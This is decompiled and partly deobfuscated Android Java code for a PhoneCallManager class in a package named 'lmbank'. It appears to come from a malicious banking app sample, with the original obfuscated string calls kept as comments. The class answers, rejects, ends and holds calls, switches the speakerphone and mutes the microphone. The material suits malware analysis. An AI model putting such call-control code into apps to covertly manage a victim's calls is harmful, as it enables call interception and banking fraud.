package com.wish.lmbank.phone;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.media.AudioManager;
import android.os.Build;
import android.telecom.Call;
import android.util.Log;

import com.wish.lmbank.utils.LogUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/phone/PhoneCallManager.class */
public class PhoneCallManager {
    private static final String TAG = "com.wish.lmbank.phone.PhoneCallManager";
    private static AudioManager audioManager;
    public static Call call;
    private static int mAudioMode;
    private static boolean mIsAudioSpeakerOn;
    private Context context;

    public PhoneCallManager(Context context) {
        this.context = context;
//         audioManager = (AudioManager) context.getSystemService(bb7d7pu7.m5998("CBwNAAY"));
        audioManager = (AudioManager) context.getSystemService("audio");
    }

    @SuppressLint("LongLogTag")
    public void saveInitState() {
        AudioManager audioManager2 = audioManager;
        if (audioManager2 == null) {
            return;
        }
        mIsAudioSpeakerOn = audioManager2.isSpeakerphoneOn();
        mAudioMode = audioManager.getMode();
//         Log.v(TAG, bb7d7pu7.m5998("GggfDCAHAB06HQgdDEVJBCAaKBwNAAY6GQwIAgwbJgdTSQ") + mIsAudioSpeakerOn + bb7d7pu7.m5998("RUkEKBwNAAYkBg0MU0k") + mAudioMode);
        Log.v(TAG, "saveInitState, mIsAudioSpeakerOn: " + mIsAudioSpeakerOn + ", mAudioMode: " + mAudioMode);
    }

    @SuppressLint("LongLogTag")
    public static void resetInitState() {
        if (audioManager == null) {
            return;
        }
        String str = TAG;
//         Log.v(str, bb7d7pu7.m5998("GwwaDB0gBwAdOh0IHQxFSQQgGigcDQAGOhkMCAIMGyYHU0k") + mIsAudioSpeakerOn + bb7d7pu7.m5998("RUkEKBwNAAYkBg0MU0k") + mAudioMode + bb7d7pu7.m5998("RUkAGjoZDAgCDBsZAQYHDCYHU0k") + audioManager.isSpeakerphoneOn());
        Log.v(str, "resetInitState, mIsAudioSpeakerOn: " + mIsAudioSpeakerOn + ", mAudioMode: " + mAudioMode + ", isSpeakerphoneOn: " + audioManager.isSpeakerphoneOn());
        if (Build.VERSION.SDK_INT < 30 || !audioManager.isSpeakerphoneOn()) {
            return;
        }
        PhoneCallService phoneCallService = PhoneCallService.getInstance();
        if (Build.VERSION.SDK_INT > 30 && phoneCallService != null) {
            phoneCallService.setAudioRoute(5);
            return;
        }
        audioManager.setSpeakerphoneOn(false);
        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
        AudioManager audioManager2 = audioManager;
        audioManager2.setStreamVolume(0, audioManager2.getStreamMaxVolume(0), 0);
    }

    @TargetApi(Build.VERSION_CODES.M)
    public static boolean endCall() {
        Call call2 = call;
        if (call2 != null) {
            if (call2.getState() == Call.STATE_RINGING) {
                call2.reject(false, null);
                return true;
            }
            call2.disconnect();
            return true;
        }
        return false;
    }

    @TargetApi(Build.VERSION_CODES.M)
    public static void answer() {
        Call call2 = call;
        if (call2 != null) {
            call2.answer(0);
        }
    }

    @SuppressLint("WrongConstant")
    public boolean setSpeaker() {
        AudioManager audioManager2 = audioManager;
        if (audioManager2 != null) {
            audioManager2.setMode(AudioManager.MODE_IN_CALL);
            boolean z = !audioManager2.isSpeakerphoneOn();
            int i = z ? 8 : 5;
            if (Build.VERSION.SDK_INT > 30 && PhoneCallService.getInstance() != null) {
                try {
                    PhoneCallService.getInstance().setAudioRoute(i);
                } catch (Exception e) {
                }
                return z;
            } else if (audioManager2.isSpeakerphoneOn()) {
                audioManager2.setSpeakerphoneOn(false);
                if (Build.VERSION.SDK_INT >= 30) {
                    audioManager2.setMode(AudioManager.MODE_IN_COMMUNICATION);
                    audioManager2.setStreamVolume(0, audioManager2.getStreamMaxVolume(0), 0);
                    return false;
                }
                return false;
            } else if (Build.VERSION.SDK_INT < 30) {
                audioManager2.setSpeakerphoneOn(true);
                return true;
            } else {
                audioManager2.setMode(AudioManager.MODE_CURRENT);
                audioManager2.setSpeakerphoneOn(true);
                audioManager2.setStreamVolume(1, audioManager2.getStreamVolume(1), 0);
                return true;
            }
        }
        return false;
    }

    @TargetApi(Build.VERSION_CODES.M)
    public boolean disconnect() {
        Call call2 = call;
        if (call2 != null) {
            call2.disconnect();
            return true;
        }
//         LogUtils.callLog(bb7d7pu7.m5998("DBEKDBkdAAYHU0kNABoKBgcHDAodSY_-yY_a_I_l64__xI793IHG9A"));
        LogUtils.callLog("exception: disconnect 无法挂断电话");
        return false;
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void reject() {
        Call call2 = call;
        if (call2 != null) {
            call2.reject(false, null);
            return;
        }
    }

    public void openSpeaker() {
        AudioManager audioManager2 = audioManager;
        if (audioManager2 != null) {
            audioManager2.setMode(AudioManager.MODE_IN_CALL);
            audioManager.setSpeakerphoneOn(true);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public boolean isCallActive() {
            Call call2 = call;
            return call2 != null && call2.getState() == Call.STATE_ACTIVE;
    }

    public void destroy() {
        call = null;
        this.context = null;
        audioManager = null;
    }

    public boolean setMicrophone() {
        AudioManager audioManager2 = audioManager;
        boolean z = false;
        if (audioManager2 != null) {
            if (audioManager2.isMicrophoneMute()) {
                audioManager2.setMicrophoneMute(false);
                return false;
            }
            z = true;
            audioManager2.setMicrophoneMute(true);
        }
        return z;
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void setCallHold(boolean z) {
        Call call2 = call;
        if (call2 != null) {
            if (z) {
                call2.hold();
            } else {
                call2.unhold();
            }
        }
    }
}
